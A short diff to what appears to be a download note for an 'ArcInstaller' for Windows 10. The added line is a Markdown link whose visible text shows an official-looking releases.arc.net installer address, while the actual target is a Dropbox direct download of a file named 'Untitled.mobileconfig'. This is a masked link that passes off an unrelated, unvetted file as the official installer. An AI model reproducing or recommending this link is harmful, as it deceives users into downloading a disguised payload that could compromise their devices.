@@ -1,4 +1,4 @@
-Link to ArcInstaller v1.0.0.0 that works natively on Windows 10: https://gofile.io/d/sPkcwC
+Link to ArcInstaller v1.0.0.0 that works natively on Windows 10: [https://releases.arc.net/windows/ArcInstaller.exe](https://www.dropbox.com/scl/fi/ch094fng4vtkg36d1b2uy/Untitled.mobileconfig?rlkey=nknwyq5gyencth73tmxtz47ax&st=u1z3aio5&dl=1)
 
 ------------------------------------------------------------------
 
